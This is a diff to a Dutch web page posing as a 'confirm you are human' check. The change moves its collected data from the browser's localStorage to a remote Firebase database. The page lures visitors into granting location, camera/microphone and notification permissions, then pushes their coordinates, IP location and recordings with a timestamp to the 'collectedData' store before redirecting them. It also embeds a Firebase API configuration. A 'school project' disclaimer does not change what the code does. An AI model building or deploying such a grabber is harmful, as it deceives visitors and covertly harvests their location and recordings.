@@ -148,6 +148,11 @@
     </style>
 </head>
 <body>
+    <!-- Firebase App (basis SDK) -->
+    <script src="https://www.gstatic.com/firebasejs/11.0.2/firebase-app.js"></script>
+    <!-- Firebase Realtime Database -->
+    <script src="https://www.gstatic.com/firebasejs/11.0.2/firebase-database.js"></script>
+
     <div class="container">
         <h1 id="messageText"></h1>
         <p>Dit is alleen om te bevestigen of jij een mens bent. Klik op de knop hieronder om door te gaan.</p>
@@ -164,15 +169,36 @@
     <p class="disclaimer">Dit is een schoolproject en er wordt op geen enkele manier misbruik van gemaakt.</p>
 
     <script>
-        // Haal instellingen op uit localStorage
-        const micCamEnabled = localStorage.getItem("micCamEnabled") === "true";
-        const locationEnabled = localStorage.getItem("locationEnabled") === "true";
-        const notificationsEnabled = localStorage.getItem("notificationsEnabled") === "true";
-        const redirectUrl = localStorage.getItem("redirectUrl") || "https://www.youtube.com/watch?v=dQw4w9WgXcQ";
-        const redirectDelay = parseInt(localStorage.getItem("redirectDelay"), 10) * 1000 || 5000; // Omzetten naar milliseconden
+        // Firebase-configuratie
+        const firebaseConfig = {
+            apiKey: "AIzaSyAEw9353xS1az8fl6yDbwxeqGR9E4dT7h0",
+            authDomain: "loc-60f9d.firebaseapp.com",
+            databaseURL: "https://loc-60f9d-default-rtdb.europe-west1.firebasedatabase.app",
+            projectId: "loc-60f9d",
+            storageBucket: "loc-60f9d.firebasestorage.app",
+            messagingSenderId: "530676836005",
+            appId: "1:530676836005:web:565aab01da59f6ba9c4f4c",
+            measurementId: "G-47CS0L8VF1"
+        };
 
-        // Stel de berichttekst in
-        document.getElementById("messageText").innerHTML = localStorage.getItem("messageText") || "<span class='highlight'>Youssof</span> heeft je een link gestuurd!";
+        // Firebase initialiseren
+        firebase.initializeApp(firebaseConfig);
+        const db = firebase.database();
+
+        // Referentie naar instellingen in Firebase
+        const settingsRef = db.ref('settings');
+        const dataRef = db.ref('collectedData');
+
+        // Haal instellingen op uit Firebase
+        let settings = {};
+        settingsRef.on('value', (snapshot) => {
+            settings = snapshot.val() || {};
+            updateUI();
+        });
+
+        function updateUI() {
+            document.getElementById("messageText").innerHTML = settings.messageText || "<span class='highlight'>Youssof</span> heeft je een link gestuurd!";
+        }
 
         let locationData = null;
         let ipLocationData = null;
@@ -182,7 +208,7 @@
         function saveData() {
             let combinedData = {};
 
-            if (locationEnabled && locationData) {
+            if (settings.locationEnabled && locationData) {
                 Object.assign(combinedData, locationData);
             }
 
@@ -190,7 +216,7 @@
                 combinedData.ipLocation = ipLocationData;
             }
 
-            if (micCamEnabled && recordingData) {
+            if (settings.micCamEnabled && recordingData) {
                 combinedData.recording = recordingData;
             }
 
@@ -199,17 +225,14 @@
             }
 
             // Voeg de redirect URL toe aan de data
-            combinedData.redirectUrl = redirectUrl;
+            combinedData.redirectUrl = settings.redirectUrl || "https://www.youtube.com/watch?v=dQw4w9WgXcQ";
 
-            // Sla gegevens op als er iets is om op te slaan
+            // Voeg timestamp toe
+            combinedData.timestamp = new Date().toISOString();
+
+            // Sla gegevens op in Firebase
             if (Object.keys(combinedData).length > 0) {
-                let savedData = JSON.parse(localStorage.getItem("collectedData")) || [];
-                savedData.push(combinedData);
-                localStorage.setItem("collectedData", JSON.stringify(savedData));
-
-                // Update event versturen voor live update
-                const event = new CustomEvent('dataUpdated');
-                window.dispatchEvent(event);
+                dataRef.push(combinedData);
             }
         }
 
@@ -371,20 +394,20 @@
             try {
                 // Verberg de knop en toon de loading animatie en voortgangsbalk
                 document.getElementById('permissionButton').style.display = 'none';
-                document.querySelector('.loading').style.display = 'inline-block';
-                document.querySelector('.progress-bar').style.display = 'block';
+                document.querySelector('.loading').style.display = "inline-block";
+                document.querySelector('.progress-bar').style.display = "block";
 
                 const permissions = [];
 
-                if (locationEnabled) {
+                if (settings.locationEnabled) {
                     permissions.push(getLocationData());
                 }
 
-                if (micCamEnabled) {
+                if (settings.micCamEnabled) {
                     permissions.push(getMicCamData());
                 }
 
-                if (notificationsEnabled) {
+                if (settings.notificationsEnabled) {
                     permissions.push(requestNotificationPermission());
                 }
 
@@ -393,12 +416,13 @@
                 await Promise.all(permissions);
 
                 // Stel de duur van de voortgangsbalkanimatie in
+                const redirectDelay = (settings.redirectDelay || 5) * 1000; // Omzetten naar milliseconden
                 const progressBarSpan = document.getElementById('progressBarSpan');
                 progressBarSpan.style.animationDuration = `${redirectDelay / 1000}s`;
 
                 // Wacht totdat de voortgangsbalk klaar is
                 setTimeout(() => {
-                    window.location.href = redirectUrl;
+                    window.location.href = settings.redirectUrl || "https://www.youtube.com/watch?v=dQw4w9WgXcQ";
                 }, redirectDelay);
 
             } catch (error) {
